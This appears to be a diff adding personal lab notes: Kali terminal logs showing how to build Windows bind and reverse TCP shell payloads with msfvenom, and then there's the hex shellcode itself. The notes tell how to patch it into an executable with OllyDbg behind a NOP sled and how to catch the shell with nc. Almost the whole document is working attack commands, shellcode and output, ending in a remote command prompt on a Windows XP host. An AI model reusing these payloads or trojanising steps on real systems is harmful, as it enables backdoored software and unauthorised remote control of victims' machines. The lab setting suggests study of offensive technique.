@@ -1,0 +1,213 @@
+BIND AND REVERSE BIND
+
+Before this make sure to make necessary changes in the executable to create pop-up before opening.
+--------------------------- BIND SHELL ----------------
+1. FINDING ATTACKER IP:
+                                                                            
+┌──(root㉿kali)-[~]
+└─# ifconfig 
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.184.131  netmask 255.255.255.0  broadcast 192.168.184.255
+        inet6 fe80::d829:80c3:3230:6d4d  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:8e:65:5a  txqueuelen 1000  (Ethernet)
+        RX packets 16  bytes 1642 (1.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 152  bytes 13558 (13.2 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 4  bytes 240 (240.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4  bytes 240 (240.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+* Attacker ip is 192.168.184.131
+
+
+2. Checking connection between the attacker and victim   
+                                                                          
+┌──(root㉿kali)-[~]
+└─# ping -s 32 192.168.184.128
+PING 192.168.184.128 (192.168.184.128) 32(60) bytes of data.
+40 bytes from 192.168.184.128: icmp_seq=71 ttl=128 time=36.7 ms
+40 bytes from 192.168.184.128: icmp_seq=72 ttl=128 time=1.11 ms
+40 bytes from 192.168.184.128: icmp_seq=73 ttl=128 time=1.31 ms
+40 bytes from 192.168.184.128: icmp_seq=74 ttl=128 time=0.883 ms
+^C
+--- 192.168.184.128 ping statistics ---
+87 packets transmitted, 17 received, 80.4598% packet loss, time 87782ms
+rtt min/avg/max/mdev = 0.503/3.157/36.722/8.393 ms
+                                                               
+                                                                              
+3. GENERATING SHELL CODE
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# msfvenom -p windows/shell_bind_tcp LPORT=4444 raw>bindshell
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 328 bytes
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# file bindshell
+bindshell: data
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# hexdump -C bindshell| cut -d " " -f3-20| tr -d " " | tr -d "\n"
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200115c89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd500000148   
+
+4. Copy paste this shellcode till 'ffd5' and binary paste this after the address where we added the extra header. Make sure to leave an NOP Sledge before the 'Binary Paste' in OllyDBG and save the file as a new executable
+                                                       
+5. Now run the new executable in windows and you will see that port 4444 has opened in Windows and then you can type the below command to get access to the victim windows   
+                                                                                                      
+┌──(root㉿kali)-[~]
+└─# nc 192.168.184.128 4444                                        
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Administrator\Desktop>^C
+
+____________________________________________________________________________________________________________________________________________________________________________________________
+----------------------------------------------------------------------------- REV BIND SHELL -----------------------------------------------------------------------------------------------
+____________________________________________________________________________________________________________________________________________________________________________________________
+                                                                                                                                                                  
+1. ENABLE SSH IN LINUX(ATTACKER)              
+┌──(root㉿kali)-[~]
+└─# sudo apt-get install ssh       
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+Processing triggers for libc-bin (2.37-12) ...
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# sudp service ssh start  
+Command 'sudp' not found, did you mean:
+  command 'sudo' from deb sudo
+  command 'sudo' from deb sudo-ldap
+  command 'sup' from deb sup
+  command 'sfdp' from deb graphviz
+Try: apt install <deb name>
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# service ssh start 
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# sudo update-rc.d -f ssh remove
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# sudo update-rc.d -f ssg defaults
+update-rc.d: error: unable to read /etc/init.d/ssg
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# sudo update-rc.d -f ssh defaults
+                                                                                                                                                                  
+i. CHECKING THE SSH STATUS
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# service ssh status                                           
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; preset: disabled)
+     Active: active (running) since Tue 2024-01-30 03:58:45 EST; 5min ago
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+   Main PID: 65991 (sshd)
+      Tasks: 1 (limit: 2249)
+     Memory: 1.5M
+        CPU: 171ms
+     CGroup: /system.slice/ssh.service
+             └─65991 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+
+Jan 30 03:58:45 kali systemd[1]: Starting ssh.service - OpenBSD Secure Shell server...
+Jan 30 03:58:45 kali sshd[65991]: Server listening on 0.0.0.0 port 22.
+Jan 30 03:58:45 kali sshd[65991]: Server listening on :: port 22.
+Jan 30 03:58:45 kali systemd[1]: Started ssh.service - OpenBSD Secure Shell server.
+                                                                                      
+2. DISABLE FIREWALL IN LINUX                                                                            
+┌──(root㉿kali)-[~]
+└─# ufw disable
+Command 'ufw' not found, but can be installed with:
+apt install ufw
+Do you want to install it? (N/y)y
+apt install ufw
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+Processing triggers for man-db (2.12.0-1) ...
+                                                                                                                                                                  
+3. GENERATE PAYLOAD FOR REVERSE BIND SHELL                                                                                                                                                                  
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.184.131 LPORT=4444 -f raw > revbind
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+
+4. MAKE THE PAYLOAD THE CORRECT FORMAT
+                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# hexdump -C revbind | cut -d " " -f3-20| tr -d " " | tr -d "\n"                         
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8b883680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd500000144                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# hexdump -C revbind                                            
+00000000  fc e8 82 00 00 00 60 89  e5 31 c0 64 8b 50 30 8b  |......`..1.d.P0.|
+00000010  52 0c 8b 52 14 8b 72 28  0f b7 4a 26 31 ff ac 3c  |R..R..r(..J&1..<|
+00000020  61 7c 02 2c 20 c1 cf 0d  01 c7 e2 f2 52 57 8b 52  |a|., .......RW.R|
+00000030  10 8b 4a 3c 8b 4c 11 78  e3 48 01 d1 51 8b 59 20  |..J<.L.x.H..Q.Y |
+00000040  01 d3 8b 49 18 e3 3a 49  8b 34 8b 01 d6 31 ff ac  |...I..:I.4...1..|
+00000050  c1 cf 0d 01 c7 38 e0 75  f6 03 7d f8 3b 7d 24 75  |.....8.u..}.;}$u|
+00000060  e4 58 8b 58 24 01 d3 66  8b 0c 4b 8b 58 1c 01 d3  |.X.X$..f..K.X...|
+00000070  8b 04 8b 01 d0 89 44 24  24 5b 5b 61 59 5a 51 ff  |......D$$[[aYZQ.|
+00000080  e0 5f 5f 5a 8b 12 eb 8d  5d 68 33 32 00 00 68 77  |.__Z....]h32..hw|
+00000090  73 32 5f 54 68 4c 77 26  07 ff d5 b8 90 01 00 00  |s2_ThLw&........|
+000000a0  29 c4 54 50 68 29 80 6b  00 ff d5 50 50 50 50 40  |).TPh).k...PPPP@|
+000000b0  50 40 50 68 ea 0f df e0  ff d5 97 6a 05 68 c0 a8  |P@Ph.......j.h..|
+000000c0  b8 83 68 02 00 11 5c 89  e6 6a 10 56 57 68 99 a5  |..h...\..j.VWh..|
+000000d0  74 61 ff d5 85 c0 74 0c  ff 4e 08 75 ec 68 f0 b5  |ta....t..N.u.h..|
+000000e0  a2 56 ff d5 68 63 6d 64  00 89 e3 57 57 57 31 f6  |.V..hcmd...WWW1.|
+000000f0  6a 12 59 56 e2 fd 66 c7  44 24 3c 01 01 8d 44 24  |j.YV..f.D$<...D$|
+00000100  10 c6 00 44 54 50 56 56  56 46 56 4e 56 56 53 56  |...DTPVVVFVNVVSV|
+00000110  68 79 cc 3f 86 ff d5 89  e0 4e 56 46 ff 30 68 08  |hy.?.....NVF.0h.|
+00000120  87 1d 60 ff d5 bb f0 b5  a2 56 68 a6 95 bd 9d ff  |..`......Vh.....|
+00000130  d5 3c 06 7c 0a 80 fb e0  75 05 bb 47 13 72 6f 6a  |.<.|....u..G.roj|
+00000140  00 53 ff d5                                       |.S..|
+00000144
+                                                                                                                         
+┌──(root㉿kali)-[~]
+└─# hexdump -C revbind | cut -d " " -f3-20| tr -d " " | tr -d "\n"
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8b883680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd500000144                                                                                                                         
+
+5. 'BINARY PASTE' THIS INTO THE ONLLY DBG IN THE NEW SECTION ADDED BY US AND THEN SAVE IT INTO A NEW EXECUTABLE
+
+6. RUN THIS COMMAND IN LINUX AND THEN OPEN THE NEW EXECUTABLE IN WINDOWS THEN OUR CONNECTION IS SUCCESSFUL!                                                                                                                 
+┌──(root㉿kali)-[~]
+└─# nc -lvp 4444
+listening on [any] 4444 ...
+192.168.184.128: inverse host lookup failed: Unknown host
+connect to [192.168.184.131] from (UNKNOWN) [192.168.184.128] 1335
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Administrator\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.184.128
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.184.2
+
+Ethernet adapter Bluetooth Network Connection:
+
+        Media State . . . . . . . . . . . : Media disconnected
+
+C:\Documents and Settings\Administrator\Desktop>^C
+
+---------------------------------------------------------------------------REVERSE BIND COMPLETE!!------------------------------------------------------------------------------------------
